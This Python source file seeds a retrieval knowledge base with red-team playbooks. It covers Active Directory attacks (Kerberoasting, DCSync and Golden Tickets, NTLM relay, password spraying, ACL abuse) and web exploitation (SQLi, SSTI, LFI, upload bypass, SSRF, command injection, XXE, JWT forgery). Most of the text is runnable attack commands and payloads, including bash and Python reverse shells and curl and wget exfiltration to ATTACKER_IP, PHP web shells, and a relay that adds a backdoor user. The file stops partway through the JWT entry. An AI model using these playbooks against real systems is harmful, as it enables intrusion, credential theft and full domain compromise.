"""
redteam_kb_seed.py - Structured red-team attack playbooks for ARGUS RAG

Contains 75+ attack playbooks covering:
  Active Directory, Web Apps, Linux/Windows PrivEsc,
  Network Services, Databases, Containers, Cloud, Password Attacks

Usage: python3 knowledge/ingest_data.py --seed-redteam
"""
from __future__ import annotations
from typing import List, Dict, Any


def _pb(title, text, phase, tools, mitre_ttps, attack_types,
        services=None, os_hint="", outcome="shell obtained"):
    return {
        "title": title,
        "text": text.strip(),
        "metadata": {
            "chunk_type":   "playbook",
            "phase":        phase,
            "outcome":      outcome,
            "tools":        tools,
            "mitre_ttps":   mitre_ttps,
            "attack_types": attack_types,
            "services":     services or [],
            "os":           os_hint,
            "section_title": title,
            "source_type":  "redteam_seed",
        },
    }


# ── prefix prepended to embedding text so the model knows these are attack playbooks ──
_EMBED_PREFIX = "Red team attack playbook for penetration testing: "


# ===========================================================================
#  ACTIVE DIRECTORY PLAYBOOKS
# ===========================================================================

AD_PLAYBOOKS = [

_pb(
    title="AD - BloodHound Enumeration",
    phase="recon", outcome="attack path discovered",
    tools=["bloodhound", "sharphound", "bloodhound-python"],
    mitre_ttps=["T1069.002", "T1087.002", "T1482"],
    attack_types=["ad_enum"], services=["ldap", "kerberos", "smb"],
    os_hint="windows active directory",
    text="""
Active Directory Enumeration with BloodHound. ALWAYS run this first on any AD target.
BloodHound maps the entire AD trust graph and shows shortest attack paths to Domain Admin.

DETECT: Port 389 LDAP, port 88 Kerberos, port 445 SMB open = Domain Controller present.
  nmap --script ldap-rootdse,smb-security-mode TARGET_IP

COLLECT FROM LINUX no agent needed:
  bloodhound-python -u USER -p PASS -d DOMAIN.LOCAL -ns DC_IP -c All --zip
  bloodhound-python -u USER -p PASS -d DOMAIN.LOCAL -ns DC_IP -c DCOnly

COLLECT FROM WINDOWS with SharpHound:
  SharpHound.exe -c All --zipfilename loot.zip
  SharpHound.exe -c All,GPOLocalGroup --Loop --LoopDuration 02:00:00

START BLOODHOUND: sudo neo4j start then bloodhound, upload the zip file.

KEY QUERIES IN BLOODHOUND UI:
  Shortest Paths to Domain Admins
  Find Principals with DCSync Rights
  Kerberoastable Users - export list then crack
  ASREPRoastable Users
  Computers with Unconstrained Delegation
  Shortest Path from Owned Principals - mark compromised users first

WHAT TO LOOK FOR:
  GenericWrite / GenericAll / WriteDACL edges pointing to high-value targets
  Users with SPN set = Kerberoastable
  Accounts with DONT_REQ_PREAUTH = ASREPRoastable
  Computers with Unconstrained Delegation can capture TGTs from any connecting user
  ACL abuse paths: ForceChangePassword, AddMember, Owns, WriteOwner
  LAPS disabled on workstations = same local admin password everywhere

MITRE: T1069.002 Group Discovery, T1087.002 Account Discovery, T1482 Domain Trust Discovery
"""),

_pb(
    title="AD - Kerberoasting Service Account Hash Cracking",
    phase="exploit", outcome="credential obtained",
    tools=["GetUserSPNs", "impacket", "rubeus", "hashcat"],
    mitre_ttps=["T1558.003"],
    attack_types=["kerberoasting"], services=["kerberos", "ldap"],
    os_hint="windows active directory",
    text="""
Kerberoasting - Request TGS tickets for accounts with Service Principal Names and crack offline.
Requires only ANY valid domain user account. No elevated privileges needed.

WHY IT WORKS: Any domain user can request a TGS ticket for any SPN-configured account.
The ticket is encrypted with the service account NTLM hash. Crack it offline with hashcat.

ENUMERATE AND REQUEST TICKETS from Linux:
  impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile hashes.kerberoast
  impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat

ENUMERATE AND REQUEST TICKETS from Windows Rubeus:
  Rubeus.exe kerberoast /enctype:rc4 /outfile:hashes.kerberoast /nowrap
  Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

CRACK WITH HASHCAT mode 13100 for RC4, mode 19700 for AES256:
  hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
  hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule

USE THE CRACKED CREDENTIAL:
  evil-winrm -i DC_IP -u svc_account -p CrackedPassword
  crackmapexec smb SUBNET/24 -u svc_account -p CrackedPassword
  impacket-psexec DOMAIN/svc_account:CrackedPassword@TARGET

TIPS:
  Service accounts with Password Never Expires have old weak passwords
  Target accounts with _svc, svc_, sql, iis, web, backup, admin in name
  Force RC4 with /enctype:rc4 in Rubeus because RC4 cracks 10x faster than AES256
  RC4 hashes start with $krb5tgs$23, AES256 hashes start with $krb5tgs$18

MITRE: T1558.003 Steal or Forge Kerberos Tickets Kerberoasting
"""),

_pb(
    title="AD - ASREPRoasting No Preauthentication Required",
    phase="exploit", outcome="credential obtained",
    tools=["GetNPUsers", "impacket", "rubeus", "hashcat", "kerbrute"],
    mitre_ttps=["T1558.004"],
    attack_types=["asreproasting"], services=["kerberos"],
    os_hint="windows active directory",
    text="""
ASREPRoasting - Attack accounts with DONT_REQ_PREAUTH flag set.
Does NOT require any domain credentials. Perfect for initial access with only a username list.

GET USERNAMES FIRST if no creds:
  kerbrute userenum --dc DC_IP -d DOMAIN.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
  enum4linux-ng -U DC_IP
  nmap -p 389 --script ldap-search TARGET_IP

ROAST WITHOUT CREDENTIALS using username list:
  impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt -dc-ip DC_IP -request -format hashcat
  impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt -dc-ip DC_IP -outputfile asrep.txt

ROAST WITH CREDENTIALS finds ALL vulnerable accounts automatically:
  impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat
  Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap

CRACK WITH HASHCAT mode 18200:
  hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
  hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

USE THE ACCOUNT:
  evil-winrm -i DC_IP -u USERNAME -p CrackedPassword
  crackmapexec smb DC_IP -u USERNAME -p CrackedPassword --shares

MITRE: T1558.004 Steal or Forge Kerberos Tickets AS-REP Roasting
"""),

_pb(
    title="AD - Pass-the-Hash PTH Lateral Movement",
    phase="lateral", outcome="lateral movement",
    tools=["crackmapexec", "impacket", "evil-winrm", "psexec", "wmiexec"],
    mitre_ttps=["T1550.002"],
    attack_types=["pass_the_hash"], services=["smb", "winrm"],
    os_hint="windows",
    text="""
Pass-the-Hash PTH - Authenticate with NTLM hash without the plaintext password.
Works for local admin and domain accounts. Protected Users group members are immune.

EXTRACT NTLM HASHES from local SAM need local admin:
  crackmapexec smb TARGET_IP -u Administrator -p pass --sam
  impacket-secretsdump LOCAL/Administrator:pass@TARGET_IP

EXTRACT DOMAIN HASHES need Domain Admin or DCSync rights:
  impacket-secretsdump DOMAIN/Administrator:pass@DC_IP -just-dc-ntds

LATERAL MOVEMENT WITH HASH:
  impacket-psexec Administrator@TARGET_IP -hashes :NTHASH
  impacket-wmiexec Administrator@TARGET_IP -hashes :NTHASH
  impacket-smbexec Administrator@TARGET_IP -hashes :NTHASH
  evil-winrm -i TARGET_IP -u Administrator -H NTHASH
  crackmapexec smb TARGET_IP -u Administrator -H NTHASH -x whoami

SPRAY ACROSS ENTIRE SUBNET:
  crackmapexec smb 10.10.10.0/24 -u Administrator -H NTHASH --local-auth --continue-on-success
  crackmapexec winrm SUBNET/24 -u Administrator -H NTHASH

NOTE: Built-in Administrator RID 500 bypasses UAC remote restrictions on workstations.
Domain admin always works. NTLM hashes format is LM:NT or just NT after the colon.

MITRE: T1550.002 Use Alternate Authentication Material Pass the Hash
"""),

_pb(
    title="AD - DCSync Extract All Domain Hashes",
    phase="post", outcome="domain compromise",
    tools=["secretsdump", "impacket", "mimikatz"],
    mitre_ttps=["T1003.006"],
    attack_types=["dcsync"], services=["ldap"],
    os_hint="windows active directory",
    text="""
DCSync - Simulate DC replication to dump ALL Active Directory password hashes.
Requires Domain Admin, Enterprise Admin, or Replicating Directory Changes rights.

FROM LINUX with Impacket secretsdump:
  impacket-secretsdump DOMAIN/Administrator:pass@DC_IP
  impacket-secretsdump -just-dc-ntds DOMAIN/Administrator:pass@DC_IP
  impacket-secretsdump -just-dc-user krbtgt DOMAIN/admin:pass@DC_IP

FROM WINDOWS with Mimikatz:
  privilege::debug
  lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
  lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv

WHAT YOU GET:
  krbtgt hash means you can forge Golden Tickets for unlimited domain access forever
  All user NTLM hashes means PTH to any host in the domain
  All computer account hashes

FORGE GOLDEN TICKET after getting krbtgt hash:
  impacket-lookupsid DOMAIN/user:pass@DC_IP | grep Domain SID
  kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
  impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL Administrator
  export KRB5CCNAME=Administrator.ccache
  impacket-psexec -k -no-pass DC_IP

MITRE: T1003.006 OS Credential Dumping DCSync
"""),

_pb(
    title="AD - NTLM Relay with Responder and ntlmrelayx",
    phase="exploit", outcome="credential obtained",
    tools=["responder", "ntlmrelayx", "impacket"],
    mitre_ttps=["T1557.001", "T1187"],
    attack_types=["ntlm_relay"], services=["smb", "ldap"],
    os_hint="windows active directory",
    text="""
NTLM Relay - Capture NTLM authentication and relay to hosts with SMB signing disabled.
LLMNR and NBT-NS poisoning makes users connect to your attacker machine.

PREREQUISITE check SMB signing disabled:
  crackmapexec smb SUBNET/24 --gen-relay-list relay_targets.txt
  nmap -p 445 --script smb-security-mode SUBNET/24

SETUP responder disable SMB and HTTP then ntlmrelayx:
  sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
  sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
  sudo responder -I eth0 -v

  impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
  impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net user hacker P@ss /add"

RELAY TO LDAP to create computer account for RBCD attack:
  impacket-ntlmrelayx -t ldap://DC_IP -smb2support --add-computer NEWPC MyP@ss123

FORCE AUTHENTICATION if no organic traffic:
  python3 PetitPotam.py -u '' -p '' ATTACKER_IP DC_IP
  impacket-printerbug DOMAIN/USER:PASS@TARGET ATTACKER_IP

MITRE: T1557.001 LLMNR/NBT-NS Poisoning, T1187 Forced Authentication
"""),

_pb(
    title="AD - ADCS Certificate Services ESC1 ESC8 Abuse",
    phase="exploit", outcome="domain compromise",
    tools=["certipy", "rubeus", "impacket"],
    mitre_ttps=["T1649"],
    attack_types=["adcs_esc1", "certificate_abuse"], services=["ldap", "http"],
    os_hint="windows active directory",
    text="""
ADCS Certificate Abuse - Misconfigured certificate templates allow privilege escalation.
ESC1 lets any domain user enroll a certificate as the Domain Administrator.

ENUMERATE VULNERABLE CERTIFICATE TEMPLATES:
  certipy find -u USER@DOMAIN.LOCAL -p PASS -dc-ip DC_IP -vulnerable -stdout
  certipy find -u USER@DOMAIN.LOCAL -p PASS -dc-ip DC_IP -stdout | grep -i "esc\|vulnerable"

ESC1 REQUEST CERTIFICATE AS ADMINISTRATOR:
  certipy req -u USER@DOMAIN.LOCAL -p PASS -dc-ip DC_IP -target CA_HOST \
    -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@DOMAIN.LOCAL
  certipy auth -pfx administrator.pfx -dc-ip DC_IP
  impacket-psexec Administrator@DC_IP -hashes :ADMINISTRATOR_NTHASH

ESC8 RELAY TO WEB ENROLLMENT ENDPOINT:
  impacket-ntlmrelayx -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
  python3 PetitPotam.py -u '' -p '' ATTACKER_IP DC_IP
  certipy auth -pfx dc.pfx -dc-ip DC_IP

MITRE: T1649 Steal or Forge Authentication Certificates
"""),

_pb(
    title="AD - Password Spraying to Avoid Account Lockout",
    phase="recon", outcome="credential obtained",
    tools=["kerbrute", "crackmapexec"],
    mitre_ttps=["T1110.003"],
    attack_types=["password_spray"], services=["kerberos", "smb"],
    os_hint="windows active directory",
    text="""
AD Password Spraying - Try ONE password against many accounts. Stay under lockout threshold.
Typical lockout is 3 to 5 bad attempts per 30 minutes. Spray only once per hour to be safe.

CHECK LOCKOUT POLICY FIRST:
  crackmapexec smb DC_IP -u USER -p PASS --pass-pol
  enum4linux-ng -P DC_IP

ENUMERATE USERNAMES:
  kerbrute userenum --dc DC_IP -d DOMAIN.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
  ldapsearch -H ldap://DC_IP -x -b DC=domain,DC=local objectClass=person sAMAccountName 2>/dev/null | grep sAMAccountName
  crackmapexec smb DC_IP -u '' -p '' --users

SPRAY WITH KERBRUTE no lockout counters on DC event logs:
  kerbrute passwordspray --dc DC_IP -d DOMAIN.LOCAL users.txt Password123
  kerbrute passwordspray --dc DC_IP -d DOMAIN.LOCAL users.txt Spring2024!
  kerbrute passwordspray --dc DC_IP -d DOMAIN.LOCAL users.txt CompanyName1!

SPRAY WITH CRACKMAPEXEC validates on SMB:
  crackmapexec smb DC_IP -u users.txt -p Password123 --continue-on-success
  crackmapexec winrm DC_IP -u users.txt -p Password123

COMMON PASSWORDS: Password1 Password123 Welcome1 Welcome123
  Season + Year: Spring2024! Summer2024! Autumn2024! Winter2024!
  CompanyName + Number: Company1 Company123
  Month + Year: January2024 Feb2024!

MITRE: T1110.003 Brute Force Password Spraying
"""),

_pb(
    title="AD - ACL Abuse GenericWrite WriteDACL ForceChangePassword",
    phase="exploit", outcome="privilege escalation",
    tools=["powerview", "bloodhound", "impacket", "certipy"],
    mitre_ttps=["T1222.001", "T1484.001"],
    attack_types=["acl_abuse"], services=["ldap"],
    os_hint="windows active directory",
    text="""
AD ACL Abuse - Exploit misconfigured Access Control Lists to escalate privileges.
BloodHound shows these as edges. After marking owned principals, find outbound attack edges.

GENRICWRITE on User options shadow credentials or targeted kerberoasting:
  Set-DomainObject -Identity TARGET_USER -SET @{serviceprincipalname='fake/spn'}
  impacket-GetUserSPNs DOMAIN/attacker:pass -dc-ip DC_IP -request
  certipy shadow auto -u attacker@DOMAIN.LOCAL -p PASS -account TARGET_USER -dc-ip DC_IP

FORCECHANGEPASSWORD on User:
  net rpc password TARGET_USER NewPass123 -U DOMAIN/attacker%pass -S DC_IP
  Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString 'NewPass' -AsPlainText -Force)

ADDMEMBER to Group like Domain Admins:
  net rpc group addmem "Domain Admins" attacker -U DOMAIN/attacker%pass -S DC_IP
  Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

WRITEDACL grant yourself GenericAll then escalate:
  Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

WRITEOWNER take ownership first then add rights:
  Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker
  Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity attacker -Rights All

MITRE: T1222.001 File Permissions Modification, T1484.001 Group Policy Modification
"""),

_pb(
    title="AD - LAPS Local Administrator Password Solution Abuse",
    phase="lateral", outcome="credential obtained",
    tools=["crackmapexec", "ldapsearch", "powerview"],
    mitre_ttps=["T1552.006"],
    attack_types=["laps_abuse"], services=["ldap", "smb"],
    os_hint="windows",
    text="""
LAPS Abuse - Read randomized local admin passwords from AD attribute ms-mcs-admpwd.
If your account has read access to ms-mcs-admpwd, you get plaintext local admin passwords.

CHECK IF LAPS IS DEPLOYED:
  crackmapexec ldap DC_IP -u USER -p PASS -M laps
  Get-ADComputer HOSTNAME -Properties ms-mcs-admpwd | Select ms-mcs-admpwd

READ LAPS PASSWORDS with different tools:
  crackmapexec ldap DC_IP -u USER -p PASS -M laps
  ldapsearch -H ldap://DC_IP -x -D "DOMAIN\\USER" -w PASS -b DC=domain,DC=local "(ms-mcs-admpwd=*)" ms-mcs-admpwd
  Get-ADComputer -Filter * -Properties ms-mcs-admpwd | Select Name,ms-mcs-admpwd

USE THE PASSWORD for local admin access:
  crackmapexec smb TARGET_IP -u Administrator -p LAPSPassword --local-auth
  evil-winrm -i TARGET_IP -u Administrator -p LAPSPassword
  impacket-psexec Administrator:LAPSPassword@TARGET_IP

MITRE: T1552.006 Unsecured Credentials Group Policy Preferences
"""),

]  # end AD_PLAYBOOKS


# ===========================================================================
#  WEB APPLICATION PLAYBOOKS
# ===========================================================================

WEB_PLAYBOOKS = [

_pb(
    title="Web - SQL Injection with SQLMap",
    phase="exploit", outcome="data extracted",
    tools=["sqlmap", "burpsuite", "curl"],
    mitre_ttps=["T1190", "T1213"],
    attack_types=["sqli"], services=["http", "https"],
    text="""
SQL Injection - Automated and manual extraction of database contents via unsanitized input.
SQLi can lead to authentication bypass, full DB dump, and OS command execution via xp_cmdshell/UDF.

DETECT SQLI POINTS:
  sqlmap -u "http://TARGET/page?id=1" --dbs --batch --level=5 --risk=3
  sqlmap -u "http://TARGET/page?id=1" --forms --crawl=3 --batch
  sqlmap -r request.txt --dbs --batch   (request.txt from Burp Suite: right-click > Save item)

ENUMERATE DATABASES:
  sqlmap -u "http://TARGET/page?id=1" --dbs --batch
  sqlmap -u "http://TARGET/page?id=1" -D TARGET_DB --tables --batch
  sqlmap -u "http://TARGET/page?id=1" -D TARGET_DB -T users --columns --batch
  sqlmap -u "http://TARGET/page?id=1" -D TARGET_DB -T users --dump --batch

AUTHENTICATION BYPASS via login form:
  Username: admin'--
  Username: ' OR 1=1--
  Username: admin'/*
  sqlmap -u "http://TARGET/login" --data="user=admin&pass=test" --dbs --batch

OS SHELL via sqlmap if DB user has FILE privilege or xp_cmdshell:
  sqlmap -u "http://TARGET/?id=1" --os-shell --batch
  sqlmap -u "http://TARGET/?id=1" --sql-query="SELECT @@version" --batch

MSSQL SPECIFIC - xp_cmdshell for OS command execution:
  Execute: xp_cmdshell 'whoami'
  Enable if disabled: sp_configure 'show advanced options',1; RECONFIGURE; sp_configure 'xp_cmdshell',1; RECONFIGURE;
  PowerShell via xp_cmdshell: xp_cmdshell 'powershell -enc BASE64_ENCODED_CMD'

MANUAL UNION INJECTION to find column count:
  ' ORDER BY 1-- , ORDER BY 2-- (increment until error to find column count)
  ' UNION SELECT NULL,NULL,NULL--
  ' UNION SELECT 1,table_name,3 FROM information_schema.tables--

BLIND SQLI time-based detection:
  MySQL: ' AND SLEEP(5)--
  MSSQL: ' AND 1=1 WAITFOR DELAY '0:0:5'--
  Oracle: ' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(87)||CHR(65),5)=0--

MITRE: T1190 Exploit Public-Facing Application, T1213 Data from Information Repositories
"""),

_pb(
    title="Web - Server-Side Template Injection SSTI",
    phase="exploit", outcome="remote code execution",
    tools=["tplmap", "burpsuite", "curl"],
    mitre_ttps=["T1190", "T1059"],
    attack_types=["ssti"], services=["http", "https"],
    text="""
Server-Side Template Injection - Inject template syntax to execute code on the server.
Affects apps using Jinja2, Twig, FreeMarker, Velocity, Mako, etc.

DETECT SSTI - Inject math expressions into all input fields:
  {{7*7}} - if output is 49 = SSTI (Jinja2/Twig)
  ${7*7} - FreeMarker/Velocity
  <%= 7*7 %> - ERB/EJS
  #{7*7} - Pebble/Ruby
  *{7*7} - Thymeleaf

IDENTIFY ENGINE with polyglot: ${{<%[%'"}}%\
  {{7*'7'}} = 7777777 means Jinja2
  {{7*'7'}} = 49 means Twig
  Use tplmap to auto-detect: tplmap -u "http://TARGET/page?name=test"

JINJA2 RCE (Python Flask/Django):
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
  Reverse shell via Jinja2: use popen with bash reverse shell one-liner

TWIG RCE (PHP Symfony):
  {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
  {{['id']|filter('system')}}

FREEMARKER RCE (Java):
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

AUTOMATED with tplmap:
  tplmap -u "http://TARGET/?name=test" --os-shell
  tplmap -u "http://TARGET/?name=test" --os-cmd "cat /etc/passwd"

MITRE: T1190 Exploit Public-Facing Application, T1059 Command and Scripting Interpreter
"""),

_pb(
    title="Web - LFI to RCE Local File Inclusion",
    phase="exploit", outcome="remote code execution",
    tools=["burpsuite", "curl", "ffuf"],
    mitre_ttps=["T1190", "T1083", "T1059"],
    attack_types=["lfi", "path_traversal"], services=["http", "https"],
    text="""
Local File Inclusion - Read arbitrary files then escalate to Remote Code Execution.
LFI in PHP apps via ?page=, ?file=, ?include= parameters is extremely common.

BASIC LFI TEST:
  http://TARGET/index.php?page=../../../../etc/passwd
  http://TARGET/index.php?page=....//....//....//etc/passwd  (bypass filter)
  http://TARGET/index.php?page=..%2F..%2F..%2Fetc%2Fpasswd  (URL encoded)
  http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

KEY FILES TO READ:
  /etc/passwd - list valid users
  /etc/shadow - password hashes (needs root)
  /home/USER/.ssh/id_rsa - SSH private key
  /var/www/html/config.php - DB credentials
  /proc/self/environ - environment vars (may include secrets)
  /var/log/apache2/access.log - for log poisoning
  C:\Windows\win.ini - Windows LFI test

LOG POISONING for RCE:
  1. Inject PHP payload into User-Agent: User-Agent: <?php system($_GET['cmd']); ?>
     curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
  2. Include the log file with cmd param: ?page=../../../../var/log/apache2/access.log&cmd=id
  3. Other logs: /var/log/nginx/access.log, /var/log/auth.log

PHP WRAPPER RCE:
  data:// wrapper: ?page=data://text/plain,<?php system('id'); ?>
  data:// base64: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
  expect:// wrapper (rare): ?page=expect://id

MITRE: T1190 Exploit Public-Facing Application, T1083 File and Directory Discovery
"""),

_pb(
    title="Web - File Upload Bypass for Shell Upload",
    phase="exploit", outcome="remote code execution",
    tools=["burpsuite", "curl", "weevely"],
    mitre_ttps=["T1190", "T1505.003"],
    attack_types=["file_upload"], services=["http", "https"],
    text="""
File Upload Bypass - Bypass validation controls to upload and execute a web shell.
File upload functionality is one of the most dangerous features in web apps.

BASIC PHP WEB SHELL content:
  <?php system($_GET['cmd']); ?>
  <?php echo shell_exec($_REQUEST['c']); ?>
  Save as shell.php, shell.php5, shell.phtml, shell.pHp, shell.php.jpg

BYPASS MIME TYPE CHECK with Burp Suite:
  Upload a .jpg, intercept in Burp, change filename to shell.php in the POST request
  Change Content-Type header to image/jpeg while keeping .php extension

BYPASS EXTENSION BLACKLIST:
  Try: .php3, .php4, .php5, .php7, .phtml, .pht, .phps, .phar, .PHP
  Double extension: shell.php.jpg, shell.jpg.php
  Null byte (older PHP): shell.php%00.jpg
  Case variation: shell.PHP, shell.PhP

BYPASS MAGIC BYTES CHECK:
  Add JPEG header bytes before PHP code using hex editor or python
  Or use exiftool to embed in EXIF comment:
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

APACHE .htaccess UPLOAD:
  If you can upload .htaccess: AddType application/x-httpd-php .jpg
  Then upload shell.jpg which executes as PHP

LOCATE THE UPLOADED FILE:
  Default paths: /uploads/, /files/, /media/, /images/, /user_data/
  Fuzz: ffuf -w /path/to/wordlist -u http://TARGET/FUZZ/shell.php

MITRE: T1190 Exploit Public-Facing Application, T1505.003 Web Shell
"""),

_pb(
    title="Web - Server-Side Request Forgery SSRF",
    phase="exploit", outcome="internal network access",
    tools=["burpsuite", "curl", "interactsh"],
    mitre_ttps=["T1190", "T1078.004"],
    attack_types=["ssrf"], services=["http", "https"],
    text="""
SSRF - Force the server to make requests to internal resources or cloud metadata APIs.
Critical in cloud environments where IMDS metadata contains credentials.

DETECT SSRF:
  Look for: url=, path=, src=, dest=, redirect=, uri=, proxy=, load=, fetch= parameters
  Submit: http://BURP_COLLABORATOR_URL or http://interactsh.com callback URL

BASIC INTERNAL NETWORK SCAN via SSRF:
  http://TARGET/fetch?url=http://192.168.1.1/
  http://TARGET/fetch?url=http://localhost:6379/  (Redis check)
  http://TARGET/fetch?url=http://localhost:8080/  (internal admin panel)

AWS METADATA SSRF - Critical to try on any cloud app:
  http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/
  http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://TARGET/fetch?url=http://169.254.169.254/latest/user-data/

GCP METADATA:
  http://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  Note: Header required Metadata-Flavor: Google

AZURE METADATA:
  http://TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

BYPASS SSRF FILTERS:
  http://0.0.0.0/ instead of http://127.0.0.1/
  http://[::1]/ IPv6 localhost
  http://0x7F000001/ hex encoding
  http://2130706433/ decimal encoding of 127.0.0.1
  http://localtest.me/ resolves to 127.0.0.1
  Gopher protocol for Redis: gopher://127.0.0.1:6379/_FLUSHALL

MITRE: T1190 Exploit Public-Facing Application, T1078.004 Cloud Accounts
"""),

_pb(
    title="Web - Command Injection OS Command Injection",
    phase="exploit", outcome="remote code execution",
    tools=["burpsuite", "curl", "commix"],
    mitre_ttps=["T1190", "T1059"],
    attack_types=["command_injection"], services=["http", "https"],
    text="""
OS Command Injection - Inject shell commands into app inputs that call system commands.
Look for: ping, traceroute, DNS lookup, file conversion, image processing, backup features.

BASIC INJECTION PAYLOADS:
  Semicolon:   127.0.0.1; id
  Ampersand:   127.0.0.1 & id
  Pipe:        127.0.0.1 | id
  AND:         127.0.0.1 && id
  Newline:     127.0.0.1%0Aid
  Backtick:    127.0.0.1`id`
  Dollar-paren: 127.0.0.1$(id)

TIME-BASED BLIND DETECTION:
  127.0.0.1; sleep 5
  127.0.0.1 | sleep 5

OUT-OF-BAND DETECTION using DNS/HTTP callback:
  127.0.0.1; curl http://ATTACKER_IP/$(id)
  127.0.0.1; nslookup $(id).ATTACKER_DNS
  127.0.0.1; wget http://ATTACKER_IP/?x=$(id)

AUTOMATED DETECTION AND EXPLOITATION:
  commix --url="http://TARGET/?host=INJECT" --level=3
  commix --url="http://TARGET/?host=INJECT" --os-shell

REVERSE SHELL via command injection:
  127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
  127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'

MITRE: T1190 Exploit Public-Facing Application, T1059 Command and Scripting Interpreter
"""),

_pb(
    title="Web - XXE XML External Entity Injection",
    phase="exploit", outcome="file read / ssrf",
    tools=["burpsuite", "curl"],
    mitre_ttps=["T1190", "T1083"],
    attack_types=["xxe"], services=["http", "https"],
    text="""
XXE - Inject malicious XML external entities to read local files or perform SSRF.
Any endpoint accepting XML is potentially vulnerable: SOAP APIs, file uploads, SVG, DOCX.

BASIC FILE READ XXE:
  <?xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>

WINDOWS FILE READ:
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]>

SSRF via XXE to probe internal services:
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

BLIND XXE with out-of-band data exfiltration:
  Attacker hosts a DTD file at http://ATTACKER/evil.dtd containing:
    Entity percent file referencing /etc/passwd via SYSTEM
    Entity percent eval creating an exfiltration entity
    Entity percent exfil sending to attacker via HTTP
  Payload in request DOCTYPE references http://ATTACKER/evil.dtd

XXE via SVG upload:
  <?xml version="1.0" standalone="yes"?>
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
  <svg><text>&xxe;</text></svg>

MITRE: T1190 Exploit Public-Facing Application, T1083 File and Directory Discovery
"""),

_pb(
    title="Web - JWT Attack JWT Forgery and None Algorithm",
    phase="exploit", outcome="authentication bypass",
    tools=["jwt_tool", "burpsuite", "hashcat"],
    mitre_ttps=["T1190", "T1078"],
    attack_types=["jwt_attack"], services=["http", "https"],
    text="""
JWT Attacks - Forge JSON Web Tokens to escalate privileges or bypass authentication.

INSPECT JWT:
  echo "BASE64_PAYLOAD" | base64 -d  (decode payload part)
  jwt_tool TOKEN - shows header, payload, signature info

ALGORITHM CONFUSION - none algorithm:
  jwt_tool TOKEN -X a  (set algorithm to none, removes signature)
  Manually: change "alg":"RS256" to "alg":"none", remove signature

HS256 SECRET BRUTE FORCE:
  hashcat -a 0 -m 16500 JWT_TOKEN /usr/share/wordlists/rockyou.txt
  john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
  jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt

RS256 TO HS256 ALGORITHM CONFUSION:
  If app uses RS256, get the public key (from /jwks.json or /.well-known/jwks.json)
  Sign with public key using HS256 - server may verify with public key treating it as HMAC secret
  jwt_tool TOKEN -S hs256 -k public.pem

KID INJECTION (SQL/Path Traversal in kid header):
  kid: ../../dev/null  (sign with empty string as secret if kid points to /dev/null)
  kid SQL injection: kid: '; SELECT 'attacker_key'--

JWK INJECTION - embed attacker-controlled JWK in header:
  jwt_tool TOKEN -X i

FORGE TOKENS once weak secret found:
  jwt_tool TOKEN -T  (tamper mode - modify payload claims)
  Change role: "user" to "admin", add "isAdmin": true

ENDPOINTS TO CHECK:
  /.well-known/jwks.json  (public keys)
